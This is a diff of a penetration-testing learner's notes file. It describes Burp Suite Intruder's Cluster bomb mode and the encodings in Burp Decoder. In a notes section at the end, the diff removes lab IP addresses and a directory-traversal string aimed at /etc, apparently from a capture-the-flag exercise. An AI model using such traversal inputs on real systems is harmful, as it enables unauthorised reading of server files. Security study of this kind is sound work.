+      <rich_text indent="2">The Cluster bomb attack type in Burp Suite Intruder allows us to choose multiple payload sets, one per position (up to a maximum of 20). Unlike Pitchfork, where all payload sets are tested simultaneously, Cluster bomb iterates through each payload set individually, ensuring that every possible combination of payloads is tested.</rich_text>
+      <rich_text>
+
+DECODER:
+</rich_text>
+      <rich_text indent="1">Plain: This refers to the raw text before any transformations are applied.
+
+URL: Is utilized to ensure the safe transfer of data in the URL of a web request. It involves substituting characters for their ASCII character code in hexadecimal format, preceded by a percentage symbol (%). This method is vital for any type of web application testing.
+
+HTML: Replaces special characters with an ampersand (&amp;), followed by either a hexadecimal number or a reference to the character being escaped, and ending with a semicolon (;). This method ensures the safe rendering of special characters in HTML and helps prevent attacks such as XSS. The HTML option in Decoder allows any character to be encoded into its HTML escaped format or decode captured HTML entities.
+
+Base64: A commonly used encoding method, converts any data into an ASCII-compatible format. The under-the-hood functioning isn't crucial at this stage; however, interested individuals can find the underlying mathematics here.
+
+ASCII Hex: This option transitions data between ASCII and hexadecimal representations. For instance, the word "ASCII" can be converted into the hexadecimal number "4153434949". Each character is converted from its numeric ASCII representation into hexadecimal.
+
+Hex, Octal, and Binary: These encoding methods apply solely to numeric inputs, converting between decimal, hexadecimal, octal (base eight), and binary representations.
+
+Gzip: Compresses data, reducing file and page sizes before browser transmission. Faster load times are highly desirable for developers looking to enhance their SEO score and avoid user inconvenience. Decoder facilitates the manual encoding and decoding of gzip data, although it often isn't valid ASCII/Unicode.</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text indent="1">Hashing -&gt; encode ASCII HEX</rich_text>
+      <rich_text> for text</rich_text>
     </node>
   </node>
   <node name="Cryptography" unique_id="87" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699366282" ts_lastsave="1699441549">
@@ -3961,12 +4293,12 @@ GPG:
 </rich_text>
     <rich_text indent="1">New file will be created with the plaintext</rich_text>
   </node>
-  <node name="Notes" unique_id="46" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1696093389" ts_lastsave="1700230058">
-    <rich_text>10.10.110.16
+  <node name="Notes" unique_id="46" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1696093389" ts_lastsave="1702904056">
+    <rich_text>
 =================
-http://10.10.18.198/
 
-includes/../../../etc/flag3/.
+
+
 
 
 
